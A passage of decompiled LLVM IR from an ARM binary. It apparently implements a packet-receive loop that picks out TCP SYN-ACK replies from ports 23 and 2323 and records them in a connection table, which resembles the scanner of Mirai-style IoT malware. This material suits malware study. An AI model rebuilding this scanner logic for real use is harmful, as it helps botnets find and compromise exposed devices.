  %v3_111f0 = load i32, i32* %stack_var_-52, align 4
  %v1_111f4 = add i32 %v3_111f0, 1
  store i32 %v1_111f4, i32* %r3.global-to-local, align 4
  %v3_111f8 = icmp ugt i32 %v1_111f4, 383
  store i1 %v3_111f8, i1* %cpsr_c.global-to-local, align 1
  %v8_111f8 = icmp eq i32 %v1_111f4, 384
  store i1 %v8_111f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_111f4, i32* %stack_var_-52, align 4
  %v5_11200 = icmp slt i32 %v1_111f4, 384
  br i1 %v5_11200, label %.thread47.dec_label_pc_10f70_crit_edge, label %dec_label_pc_11204

.thread47.dec_label_pc_10f70_crit_edge:           ; preds = %.thread47
  %v0_10f70.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_10f70

dec_label_pc_11204:                               ; preds = %.thread47
  %v0_11204 = load i32, i32* @r8, align 4
  br label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %dec_label_pc_10f50, %dec_label_pc_11204
  %stack_var_-1872.1 = phi i32 [ %stack_var_-1872.0, %dec_label_pc_10f50 ], [ %v0_11204, %dec_label_pc_11204 ]
  %v0_11208 = call i32 @function_13c70()
  store i32 %v0_11208, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_1121c = inttoptr i32 %v0_11208 to i32*
  %v6_11244 = inttoptr i32 %v0_11280 to i32*
  %v1_11270 = add i32 %v0_11280, 16
  %v2_11270 = inttoptr i32 %v1_11270 to i32*
  %v4_1128c = ptrtoint i8* %stack_var_-1884.0 to i32
  %v1_11294 = add i32 %v4_1128c, 1
  %v2_11294 = inttoptr i32 %v1_11294 to i8*
  %v1_112b8 = add i32 %v4_1128c, 2
  %v2_112b8 = inttoptr i32 %v1_112b8 to i8*
  %v1_112bc = add i32 %v4_1128c, 3
  %v2_112bc = inttoptr i32 %v1_112bc to i8*
  %v4_112c0 = sext i8 %stack_var_-1876.0 to i32
  %v1_1139c = bitcast i8* %stack_var_-1884.0 to i32*
  %v1_11280 = add i32 %v0_11280, 9
  %v2_11280 = inttoptr i32 %v1_11280 to i8*
  %v1_112d0 = add i32 %v4_1128c, 13
  %v2_112d0 = inttoptr i32 %v1_112d0 to i8*
  %v1_112f4 = add i32 %v4_1128c, 8
  %v2_112f4 = inttoptr i32 %v1_112f4 to i32*
  %v1_11334 = add i32 %v0_11280, 12
  %v2_11334 = inttoptr i32 %v1_11334 to i32*
  br label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %dec_label_pc_112f4, %dec_label_pc_112ec, %dec_label_pc_112e4, %dec_label_pc_112b4, %dec_label_pc_112a4, %dec_label_pc_11280, %dec_label_pc_11268, %dec_label_pc_112dc, %dec_label_pc_112d0, %dec_label_pc_11260, %dec_label_pc_11394, %dec_label_pc_11208
  store i32 0, i32* %v2_1121c, align 4
  %v2_11224 = load i32, i32* @global_var_1ecd8.199, align 4
  store i32 %v2_11224, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v0_11280, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v7_11244 = call i32 @function_13ecc(i32 %v2_11224, i32* %v6_11244, i32 1514, i32 16384, i32 0, i32 0)
  store i32 %v7_11244, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11248 = icmp eq i32 %v7_11244, 0
  store i1 %v2_11248, i1* %cpsr_z.global-to-local, align 1
  %tmp304 = icmp slt i32 %v7_11244, 1
  br i1 %tmp304, label %dec_label_pc_113c8, label %dec_label_pc_11250

dec_label_pc_11250:                               ; preds = %dec_label_pc_11214
  store i32 %v0_11208, i32* %lr.global-to-local, align 4
  %v2_11254 = load i32, i32* %v2_1121c, align 4
  store i32 %v2_11254, i32* %r3.global-to-local, align 4
  %v2_11258 = icmp ugt i32 %v2_11254, 10
  store i1 %v2_11258, i1* %cpsr_c.global-to-local, align 1
  %v7_11258 = icmp eq i32 %v2_11254, 11
  store i1 %v7_11258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11258, label %dec_label_pc_113c8, label %dec_label_pc_11260

dec_label_pc_11260:                               ; preds = %dec_label_pc_11250
  %v2_11260 = icmp ugt i32 %v7_11244, 38
  store i1 %v2_11260, i1* %cpsr_c.global-to-local, align 1
  %v7_11260 = icmp eq i32 %v7_11244, 39
  store i1 %v7_11260, i1* %cpsr_z.global-to-local, align 1
  %v2_11264 = xor i1 %v2_11260, true
  %v3_11264 = or i1 %v7_11260, %v2_11264
  br i1 %v3_11264, label %dec_label_pc_11214, label %dec_label_pc_11268

dec_label_pc_11268:                               ; preds = %dec_label_pc_11260
  store i32 %v0_11280, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ecb8.86 to i32), i32* %r1.global-to-local, align 4
  %v3_11270 = load i32, i32* %v2_11270, align 4
  store i32 %v3_11270, i32* %r2.global-to-local, align 4
  %v2_11274 = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_11274, i32* %r3.global-to-local, align 4
  %v3_11278 = icmp uge i32 %v3_11270, %v2_11274
  store i1 %v3_11278, i1* %cpsr_c.global-to-local, align 1
  %v9_11278 = icmp eq i32 %v3_11270, %v2_11274
  store i1 %v9_11278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11278, label %dec_label_pc_11280, label %dec_label_pc_11214

dec_label_pc_11280:                               ; preds = %dec_label_pc_11268
  %v3_11280 = load i8, i8* %v2_11280, align 1
  %v4_11280 = zext i8 %v3_11280 to i32
  store i32 %v4_11280, i32* %r3.global-to-local, align 4
  %v2_11284 = icmp ugt i8 %v3_11280, 5
  store i1 %v2_11284, i1* %cpsr_c.global-to-local, align 1
  %v7_11284 = icmp eq i8 %v3_11280, 6
  store i1 %v7_11284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11284, label %dec_label_pc_1128c, label %dec_label_pc_11214

dec_label_pc_1128c:                               ; preds = %dec_label_pc_11280
  store i32 %v4_1128c, i32* %r3.global-to-local, align 4
  %v2_11290 = load i8, i8* %stack_var_-1884.0, align 1
  %v3_11290 = zext i8 %v2_11290 to i32
  store i32 %v3_11290, i32* %r2.global-to-local, align 4
  %v3_11294 = load i8, i8* %v2_11294, align 1
  %v4_11294 = zext i8 %v3_11294 to i32
  store i32 %v4_11294, i32* %r3.global-to-local, align 4
  %v4_11298 = mul nuw nsw i32 %v4_11294, 256
  %v5_11298 = or i32 %v4_11298, %v3_11290
  store i32 %v5_11298, i32* %r2.global-to-local, align 4
  %v2_1129c = icmp ugt i32 %v5_11298, 5887
  store i1 %v2_1129c, i1* %cpsr_c.global-to-local, align 1
  %v7_1129c = icmp eq i32 %v5_11298, 5888
  store i1 %v7_1129c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1129c, label %dec_label_pc_112b4, label %dec_label_pc_112a4

dec_label_pc_112a4:                               ; preds = %dec_label_pc_1128c
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_112ac = icmp ugt i32 %v5_11298, 4872
  store i1 %v3_112ac, i1* %cpsr_c.global-to-local, align 1
  %v9_112ac = icmp eq i32 %v5_11298, 4873
  store i1 %v9_112ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_112ac, label %dec_label_pc_112b4, label %dec_label_pc_11214

dec_label_pc_112b4:                               ; preds = %dec_label_pc_112a4, %dec_label_pc_1128c
  store i32 %v4_1128c, i32* %ip.global-to-local, align 4
  %v3_112b8 = load i8, i8* %v2_112b8, align 1
  %v4_112b8 = zext i8 %v3_112b8 to i32
  store i32 %v4_112b8, i32* %r3.global-to-local, align 4
  %v3_112bc = load i8, i8* %v2_112bc, align 1
  %v4_112bc = zext i8 %v3_112bc to i32
  store i32 %v4_112bc, i32* %r2.global-to-local, align 4
  store i32 %v4_112c0, i32* %lr.global-to-local, align 4
  %v4_112c4 = mul nuw nsw i32 %v4_112bc, 256
  %v5_112c4 = or i32 %v4_112c4, %v4_112b8
  store i32 %v5_112c4, i32* %r3.global-to-local, align 4
  %v3_112c8 = icmp uge i32 %v5_112c4, %v4_112c0
  store i1 %v3_112c8, i1* %cpsr_c.global-to-local, align 1
  %v9_112c8 = icmp eq i32 %v5_112c4, %v4_112c0
  store i1 %v9_112c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_112c8, label %dec_label_pc_112d0, label %dec_label_pc_11214

dec_label_pc_112d0:                               ; preds = %dec_label_pc_112b4
  %v3_112d0 = load i8, i8* %v2_112d0, align 1
  %v4_112d0 = zext i8 %v3_112d0 to i32
  store i32 %v4_112d0, i32* %r3.global-to-local, align 4
  %v1_112d4 = and i32 %v4_112d0, 2
  %v2_112d4 = icmp eq i32 %v1_112d4, 0
  store i1 %v2_112d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112d4, label %dec_label_pc_11214, label %dec_label_pc_112dc

dec_label_pc_112dc:                               ; preds = %dec_label_pc_112d0
  %v1_112dc = and i32 %v4_112d0, 16
  %v2_112dc = icmp eq i32 %v1_112dc, 0
  store i1 %v2_112dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112dc, label %dec_label_pc_11214, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112dc
  %v1_112e4 = and i32 %v4_112d0, 4
  %v2_112e4 = icmp eq i32 %v1_112e4, 0
  store i1 %v2_112e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112e4, label %dec_label_pc_112ec, label %dec_label_pc_11214

dec_label_pc_112ec:                               ; preds = %dec_label_pc_112e4
  %tmp448 = urem i8 %v3_112d0, 2
  %v2_112ec = icmp eq i8 %tmp448, 0
  store i1 %v2_112ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112ec, label %dec_label_pc_112f4, label %dec_label_pc_11214

dec_label_pc_112f4:                               ; preds = %dec_label_pc_112ec
  %v3_112f4 = load i32, i32* %v2_112f4, align 4
  %v1_112fc = and i32 %v3_112f4, ptrtoint (i32* @global_var_ff00.24 to i32)
  %v3_11300 = mul i32 %v3_112f4, 16777216
  %v1_112f8 = udiv i32 %v3_112f4, 256
  %v3_11304 = and i32 %v1_112f8, 65280
  %v4_11308 = mul i32 %v1_112fc, 256
  %v4_1130c = udiv i32 %v3_112f4, 16777216
  %v5_1130c = or i32 %v4_1130c, %v3_11300
  %v5_11308 = or i32 %v5_1130c, %v4_11308
  %v2_11310 = or i32 %v5_11308, %v3_11304
  %v1_11314 = add i32 %v2_11310, -1
  %v1_11318 = udiv i32 %v1_11314, 256
  %v3_1131c = and i32 %v1_11318, 65280
  %v1_11320 = and i32 %v1_11314, 65280
  store i32 %v1_11320, i32* %r2.global-to-local, align 4
  %v3_11324 = mul i32 %v1_11314, 16777216
  %v4_11328 = udiv i32 %v1_11314, 16777216
  %v5_11328 = or i32 %v3_1131c, %v4_11328
  store i32 %v5_11328, i32* %r1.global-to-local, align 4
  store i32 %v0_11280, i32* %r3.global-to-local, align 4
  %v4_11330 = mul nuw nsw i32 %v1_11320, 256
  %v5_11330 = or i32 %v4_11330, %v3_11324
  store i32 %v5_11330, i32* %r0.global-to-local, align 4
  %v3_11334 = load i32, i32* %v2_11334, align 4
  store i32 %v3_11334, i32* %r2.global-to-local, align 4
  %v2_11338 = call i32 @llvm.bswap.i32(i32 %v1_11314)
  store i32 %v2_11338, i32* %ip.global-to-local, align 4
  %v3_1133c = icmp uge i32 %v2_11338, %v3_11334
  store i1 %v3_1133c, i1* %cpsr_c.global-to-local, align 1
  %v9_1133c = icmp eq i32 %v2_11338, %v3_11334
  store i1 %v9_1133c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1133c, label %dec_label_pc_11344, label %dec_label_pc_11214

dec_label_pc_11344:                               ; preds = %dec_label_pc_112f4
  %v0_11344 = load i32, i32* @r4, align 4
  %v2_11344 = icmp ugt i32 %v0_11344, 254
  store i1 %v2_11344, i1* %cpsr_c.global-to-local, align 1
  %v7_11344 = icmp eq i32 %v0_11344, 255
  store i1 %v7_11344, i1* %cpsr_z.global-to-local, align 1
  %v8_11348 = icmp sgt i32 %v0_11344, 255
  br i1 %v8_11348, label %dec_label_pc_113c8, label %dec_label_pc_1134c

dec_label_pc_1134c:                               ; preds = %dec_label_pc_11344
  store i32 ptrtoint (i32* @global_var_1ecd4.197 to i32), i32* %lr.global-to-local, align 4
  %v3_11350 = mul i32 %v0_11344, 256
  store i32 %v3_11350, i32* %r2.global-to-local, align 4
  %v2_11354 = load i32, i32* @global_var_1ecd4.197, align 4
  store i32 %v2_11354, i32* %r1.global-to-local, align 4
  %v2_1135c = mul i32 %v0_11344, 288
  store i32 %v2_1135c, i32* %r3.global-to-local, align 4
  %v2_11360 = add i32 %v2_11354, %v2_1135c
  store i32 %v2_11360, i32* @r0, align 4
  %v1_11364 = add i32 %v2_11360, 12
  %v2_11364 = inttoptr i32 %v1_11364 to i32*
  %v3_11364 = load i32, i32* %v2_11364, align 4
  store i32 %v3_11364, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11368 = icmp eq i32 %v3_11364, 0
  store i1 %v2_11368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11368, label %dec_label_pc_11394, label %dec_label_pc_11374.preheader

dec_label_pc_11374.preheader:                     ; preds = %dec_label_pc_1134c
  %v2_1136c = add i32 %v2_11360, 288
  store i32 %v2_1136c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %dec_label_pc_11374.preheader, %dec_label_pc_11380
  %v0_11380 = phi i32 [ %v2_1136c, %dec_label_pc_11374.preheader ], [ %v1_1138c, %dec_label_pc_11380 ]
  %v0_11374 = phi i32 [ %v0_11344, %dec_label_pc_11374.preheader ], [ %v1_11374, %dec_label_pc_11380 ]
  %v1_11374 = add i32 %v0_11374, 1
  store i32 %v1_11374, i32* @r4, align 4
  %v7_11378 = icmp eq i32 %v1_11374, 256
  br i1 %v7_11378, label %dec_label_pc_113c8.loopexit, label %dec_label_pc_11380

dec_label_pc_11380:                               ; preds = %dec_label_pc_11374
  store i32 %v0_11380, i32* @r0, align 4
  %v1_11384 = add i32 %v0_11380, 12
  %v2_11384 = inttoptr i32 %v1_11384 to i32*
  %v3_11384 = load i32, i32* %v2_11384, align 4
  %v2_11388 = icmp eq i32 %v3_11384, 0
  %v1_1138c = add i32 %v0_11380, 288
  store i32 %v1_1138c, i32* %r3.global-to-local, align 4
  br i1 %v2_11388, label %dec_label_pc_11394.loopexit, label %dec_label_pc_11374

dec_label_pc_11394.loopexit:                      ; preds = %dec_label_pc_11380
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11394

dec_label_pc_11394:                               ; preds = %dec_label_pc_11394.loopexit, %dec_label_pc_1134c
  %v1_11394 = phi i32 [ %v0_11380, %dec_label_pc_11394.loopexit ], [ %v2_11360, %dec_label_pc_1134c ]
  %v2_11394 = add i32 %v1_11394, 16
  %v3_11394 = inttoptr i32 %v2_11394 to i32*
  store i32 %v3_11334, i32* %v3_11394, align 4
  store i32 %v4_1128c, i32* %r1.global-to-local, align 4
  %v2_1139c = load i32, i32* %v1_1139c, align 4
  store i32 %v2_1139c, i32* %r2.global-to-local, align 4
  %v1_113a0 = and i32 %v2_1139c, 128
  %v2_113a0 = icmp ne i32 %v1_113a0, 0
  store i1 %v2_113a0, i1* %cpsr_c.global-to-local, align 1
  %v3_113a0 = sdiv i32 %v2_1139c, 256
  store i32 %v3_113a0, i32* %r3.global-to-local, align 4
  %v1_113a4 = trunc i32 %v3_113a0 to i8
  %v2_113a4 = load i32, i32* @r0, align 4
  %v3_113a4 = add i32 %v2_113a4, 21
  %v4_113a4 = inttoptr i32 %v3_113a4 to i8*
  store i8 %v1_113a4, i8* %v4_113a4, align 1
  %v0_113a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_113a8 = trunc i32 %v0_113a8 to i8
  %v2_113a8 = load i32, i32* @r0, align 4
  %v3_113a8 = add i32 %v2_113a8, 20
  %v4_113a8 = inttoptr i32 %v3_113a8 to i8*
  store i8 %v1_113a8, i8* %v4_113a8, align 1
  %v0_113ac = call i32 @function_106a4()
  store i32 %v0_113ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11214

dec_label_pc_113b4:                               ; preds = %dec_label_pc_109f8
  store i32 ptrtoint (i32* @global_var_1ecd8.199 to i32), i32* %r2.global-to-local, align 4
  %v2_113b8 = load i32, i32* @global_var_1ecd8.199, align 4
  store i32 %v2_113b8, i32* %r0.global-to-local, align 4
  %v1_113bc = call i32 @function_1369c(i32 %v2_113b8)
  store i32 %v1_113bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_113c0

dec_label_pc_113c0:                               ; preds = %dec_label_pc_109d0, %dec_label_pc_113b4
  %v0_113c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_113c0, i32* %r0.global-to-local, align 4
  %v1_113c4 = call i32 @function_14a30(i32 %v0_113c0)
  store i32 %v1_113c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_113c8

dec_label_pc_113c8.loopexit:                      ; preds = %dec_label_pc_11374
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_11344, %dec_label_pc_11250, %dec_label_pc_11214, %dec_label_pc_113c8.loopexit, %dec_label_pc_113c0
  %stack_var_-1868.0 = phi i32 [ %tmp232, %dec_label_pc_113c0 ], [ %v0_11208, %dec_label_pc_113c8.loopexit ], [ %v0_11208, %dec_label_pc_11214 ], [ %v0_11208, %dec_label_pc_11250 ], [ %v0_11208, %dec_label_pc_11344 ]
  %stack_var_-1872.2 = phi i32 [ %tmp239, %dec_label_pc_113c0 ], [ %stack_var_-1872.1, %dec_label_pc_113c8.loopexit ], [ %stack_var_-1872.1, %dec_label_pc_11214 ], [ %stack_var_-1872.1, %dec_label_pc_11250 ], [ %stack_var_-1872.1, %dec_label_pc_11344 ]
  %stack_var_-1884.1 = phi i8* [ %tmp240, %dec_label_pc_113c0 ], [ %stack_var_-1884.0, %dec_label_pc_113c8.loopexit ], [ %stack_var_-1884.0, %dec_label_pc_11214 ], [ %stack_var_-1884.0, %dec_label_pc_11250 ], [ %stack_var_-1884.0, %dec_label_pc_11344 ]
  %stack_var_-1880.1 = phi i32 [ %tmp241, %dec_label_pc_113c0 ], [ %v0_11280, %dec_label_pc_113c8.loopexit ], [ %v0_11280, %dec_label_pc_11214 ], [ %v0_11280, %dec_label_pc_11250 ], [ %v0_11280, %dec_label_pc_11344 ]
  %stack_var_-1876.1 = phi i8 [ %tmp242, %dec_label_pc_113c0 ], [ %stack_var_-1876.0, %dec_label_pc_113c8.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_11214 ], [ %stack_var_-1876.0, %dec_label_pc_11250 ], [ %stack_var_-1876.0, %dec_label_pc_11344 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1672, i32* %ip.global-to-local, align 4
  %v2_113e0404 = load i32, i32* @sp, align 4
  %v3_113e0405 = add i32 %v2_113e0404, 1672
  %v4_113e0406 = inttoptr i32 %v3_113e0405 to i32*
  store i32 0, i32* %v4_113e0406, align 4
  br label %dec_label_pc_113d0.dec_label_pc_113d0_crit_edge

dec_label_pc_113d0.dec_label_pc_113d0_crit_edge:  ; preds = %dec_label_pc_113c8, %dec_label_pc_113d0.dec_label_pc_113d0_crit_edge
  %v0_113d0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_113e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_113d4 = add i32 %v0_113d0.pre, 4
  store i32 %v1_113d4, i32* %r3.global-to-local, align 4
  %v1_113d8 = add i32 %v0_113d0.pre, 1672
  store i32 %v1_113d8, i32* %ip.global-to-local, align 4
  %v7_113dc = icmp eq i32 %v1_113d4, 128
  %v2_113e0 = load i32, i32* @sp, align 4
  %v3_113e0 = add i32 %v2_113e0, %v1_113d8
  %v4_113e0 = inttoptr i32 %v3_113e0 to i32*
  store i32 %v0_113e0.pre, i32* %v4_113e0, align 4
  br i1 %v7_113dc, label %dec_label_pc_113e8, label %dec_label_pc_113d0.dec_label_pc_113d0_crit_edge

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113d0.dec_label_pc_113d0_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_113e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_113f0398 = add i32 %v0_113e8, 4
  store i32 %v1_113f0398, i32* %r3.global-to-local, align 4
  %v1_113f4399 = add i32 %v0_113e8, 1544
  store i32 %v1_113f4399, i32* %lr.global-to-local, align 4
  %v7_113f8400 = icmp eq i32 %v1_113f0398, 128
  %v2_113fc401 = load i32, i32* @sp, align 4
  %v3_113fc402 = add i32 %v2_113fc401, %v1_113f4399
  %v4_113fc403 = inttoptr i32 %v3_113fc402 to i32*
  store i32 %v0_113e8, i32* %v4_113fc403, align 4
  br i1 %v7_113f8400, label %dec_label_pc_11404, label %dec_label_pc_113ec.dec_label_pc_113ec_crit_edge

dec_label_pc_113ec.dec_label_pc_113ec_crit_edge:  ; preds = %dec_label_pc_113e8, %dec_label_pc_113ec.dec_label_pc_113ec_crit_edge
  %v0_113ec.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_113fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_113f0 = add i32 %v0_113ec.pre, 4
  store i32 %v1_113f0, i32* %r3.global-to-local, align 4
  %v1_113f4 = add i32 %v0_113ec.pre, 1544
  store i32 %v1_113f4, i32* %lr.global-to-local, align 4
  %v7_113f8 = icmp eq i32 %v1_113f0, 128
  %v2_113fc = load i32, i32* @sp, align 4
  %v3_113fc = add i32 %v2_113fc, %v1_113f4
  %v4_113fc = inttoptr i32 %v3_113fc to i32*
  store i32 %v0_113fc.pre, i32* %v4_113fc, align 4
  br i1 %v7_113f8, label %dec_label_pc_11404, label %dec_label_pc_113ec.dec_label_pc_113ec_crit_edge

dec_label_pc_11404:                               ; preds = %dec_label_pc_113ec.dec_label_pc_113ec_crit_edge, %dec_label_pc_113e8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_11404 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11404, i32* @r6, align 4
  store i32 %v0_11404, i32* @r5, align 4
  store i32 %v0_11404, i32* @r7, align 4
  store i32 %v0_11404, i32* %stack_var_-52, align 4
  %v2_114c0 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_1147c

dec_label_pc_11418:                               ; preds = %dec_label_pc_114a4, %dec_label_pc_1147c
  %storemerge222 = phi i32 [ 30, %dec_label_pc_1147c ], [ 5, %dec_label_pc_114a4 ]
  store i32 %storemerge222, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec70.185 to i32), i32* %r2.global-to-local, align 4
  %v2_1141c = load i32, i32* @global_var_1ec70.185, align 4
  store i32 %v2_1141c, i32* %r3.global-to-local, align 4
  %v1_11420 = add i32 %v2_11490, 8
  %v2_11420 = inttoptr i32 %v1_11420 to i32*
  %v3_11420 = load i32, i32* %v2_11420, align 4
  store i32 %v3_11420, i32* %r2.global-to-local, align 4
  %v2_11424 = sub i32 %v2_1141c, %v3_11420
  store i32 %v2_11424, i32* %r3.global-to-local, align 4
  %v3_11428 = icmp uge i32 %v2_11424, %storemerge222
  store i1 %v3_11428, i1* %cpsr_c.global-to-local, align 1
  %v9_11428 = icmp eq i32 %v2_11424, %storemerge222
  store i1 %v9_11428, i1* %cpsr_z.global-to-local, align 1
  %v2_1142c = xor i1 %v9_11428, true
  %v3_1142c = and i1 %v3_11428, %v2_1142c
  br i1 %v3_1142c, label %dec_label_pc_114e4, label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %dec_label_pc_11418
  store i1 %v2_11498, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_11498, i1* %cpsr_z.global-to-local, align 1
  %v1_114b4 = add i32 %v2_11490, 4
  %v2_114b4 = inttoptr i32 %v1_114b4 to i32*
  %v3_114b4 = load i32, i32* %v2_114b4, align 4
  br i1 %v7_11498, label %dec_label_pc_114b4, label %dec_label_pc_11438

dec_label_pc_11438:                               ; preds = %dec_label_pc_11430
  store i32 %v3_114b4, i32* %ip.global-to-local, align 4
  %v3_1143c = udiv i32 %v3_114b4, 32
  store i32 %v2_114c0, i32* %r0.global-to-local, align 4
  %v3_11444 = mul nuw nsw i32 %v3_1143c, 4
  %v2_11448 = add i32 %v3_11444, %v2_114c0
  store i32 %v2_11448, i32* %r3.global-to-local, align 4
  %v1_1144c = add i32 %v2_11448, -184
  %v2_1144c = inttoptr i32 %v1_1144c to i32*
  %v3_1144c = load i32, i32* %v2_1144c, align 4
  %v1_11450 = urem i32 %v3_114b4, 32
  store i32 %v1_11450, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_11458 = shl i32 1, %v1_11450
  %v8_11458 = or i32 %v3_1144c, %v7_11458
  store i32 %v8_11458, i32* %r2.global-to-local, align 4
  store i32 %v8_11458, i32* %v2_1144c, align 4
  %v0_11460 = load i32, i32* @r6, align 4
  %v1_11460 = load i32, i32* %ip.global-to-local, align 4
  %v3_11460 = icmp uge i32 %v0_11460, %v1_11460
  store i1 %v3_11460, i1* %cpsr_c.global-to-local, align 1
  %v9_11460 = icmp eq i32 %v0_11460, %v1_11460
  store i1 %v9_11460, i1* %cpsr_z.global-to-local, align 1
  %v5_11464 = icmp slt i32 %v0_11460, %v1_11460
  br i1 %v5_11464, label %bb306, label %bb307

bb306:                                            ; preds = %dec_label_pc_11438
  store i32 %v1_11460, i32* @r6, align 4
  br label %bb307

bb307:                                            ; preds = %dec_label_pc_114a4, %dec_label_pc_12144, %dec_label_pc_11518, %bb309, %dec_label_pc_11438, %bb306
  %v3_11468 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_11468, i32* %r3.global-to-local, align 4
  %v1_1146c = add i32 %v3_11468, 1
  store i32 %v1_1146c, i32* %r2.global-to-local, align 4
  %v2_11470 = icmp ugt i32 %v1_1146c, 254
  store i1 %v2_11470, i1* %cpsr_c.global-to-local, align 1
  %v7_11470 = icmp eq i32 %v1_1146c, 255
  store i1 %v7_11470, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_1146c, i32* %stack_var_-52, align 4
  %v8_11478 = icmp sgt i32 %v1_1146c, 255
  br i1 %v8_11478, label %dec_label_pc_11524, label %dec_label_pc_1147c

dec_label_pc_1147c:                               ; preds = %bb307, %dec_label_pc_11404
  %v0_11488 = phi i32 [ %v1_1146c, %bb307 ], [ %v0_11404, %dec_label_pc_11404 ]
  store i32 ptrtoint (i32* @global_var_1ecd4.197 to i32), i32* %r0.global-to-local, align 4
  %v3_11480 = mul i32 %v0_11488, 256
  store i32 %v3_11480, i32* %r3.global-to-local, align 4
  %v2_11484 = load i32, i32* @global_var_1ecd4.197, align 4
  store i32 %v2_11484, i32* %r1.global-to-local, align 4
  %v2_1148c = mul i32 %v0_11488, 288
  store i32 %v2_1148c, i32* %r2.global-to-local, align 4
  %v2_11490 = add i32 %v2_11484, %v2_1148c
  store i32 %v2_11490, i32* @r4, align 4
  %v1_11494 = add i32 %v2_11490, 12
  %v2_11494 = inttoptr i32 %v1_11494 to i32*
  %v3_11494 = load i32, i32* %v2_11494, align 4
  store i32 %v3_11494, i32* %ip.global-to-local, align 4
  %v2_11498 = icmp ne i32 %v3_11494, 0
  store i1 %v2_11498, i1* %cpsr_c.global-to-local, align 1
  %v7_11498 = icmp eq i32 %v3_11494, 1
  store i1 %v7_11498, i1* %cpsr_z.global-to-local, align 1
  %v2_1149c = xor i1 %v7_11498, true
  %v3_1149c = and i1 %v2_11498, %v2_1149c
  br i1 %v3_1149c, label %dec_label_pc_11418, label %dec_label_pc_114a4

dec_label_pc_114a4:                               ; preds = %dec_label_pc_1147c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_114a4 = icmp eq i32 %v3_11494, 0
  store i1 %v2_114a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114a4, label %bb307, label %dec_label_pc_11418

dec_label_pc_114b4:                               ; preds = %dec_label_pc_11430
  store i32 %v3_114b4, i32* %r0.global-to-local, align 4
  %v3_114b8 = udiv i32 %v3_114b4, 32
  %v3_114bc = mul nuw nsw i32 %v3_114b8, 4
  store i32 %v2_114c0, i32* %lr.global-to-local, align 4
  %v2_114c4 = add i32 %v3_114bc, %v2_114c0
  store i32 %v2_114c4, i32* %r3.global-to-local, align 4
  %v1_114c8 = add i32 %v2_114c4, -312
  %v2_114c8 = inttoptr i32 %v1_114c8 to i32*
  %v3_114c8 = load i32, i32* %v2_114c8, align 4
  %v1_114cc = urem i32 %v3_114b4, 32
  store i32 %v1_114cc, i32* %r1.global-to-local, align 4
  %v7_114d0 = shl i32 1, %v1_114cc
  %v8_114d0 = or i32 %v3_114c8, %v7_114d0
  store i32 %v8_114d0, i32* %r2.global-to-local, align 4
  %v0_114d4 = load i32, i32* @r5, align 4
  %v3_114d4 = icmp uge i32 %v0_114d4, %v3_114b4
  store i1 %v3_114d4, i1* %cpsr_c.global-to-local, align 1
  %v9_114d4 = icmp eq i32 %v0_114d4, %v3_114b4
  store i1 %v9_114d4, i1* %cpsr_z.global-to-local, align 1
